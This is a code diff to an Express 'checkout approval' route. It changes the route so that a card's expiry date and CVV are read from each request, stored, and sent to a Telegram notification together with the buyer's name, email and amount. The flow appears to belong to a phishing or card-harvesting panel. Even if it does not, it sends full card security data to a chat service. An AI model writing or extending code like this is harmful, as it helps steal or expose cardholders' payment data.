@@ -100,7 +100,7 @@ router.post('/events', async (req, res) => {
 // Request approval for card data step
 router.post('/approval', async (req, res) => {
   try {
-    const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4 } = req.body;
+    const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv } = req.body;
 
     // Basic validation
     if (!sessionId) {
@@ -123,6 +123,8 @@ router.post('/approval', async (req, res) => {
       installments,
       phoneMasked,
       cardLast4,
+      cardExpiry,
+      cardCvv,
     });
 
     // Send Telegram notification (non-blocking)
@@ -136,6 +138,8 @@ router.post('/approval', async (req, res) => {
       installments,
       phoneMasked,
       cardLast4,
+      cardExpiry,
+      cardCvv,
       timestamp: new Date().toISOString(),
     }).catch((err) => {
       console.error('[CheckoutApproval] Telegram notification failed:', err.message);
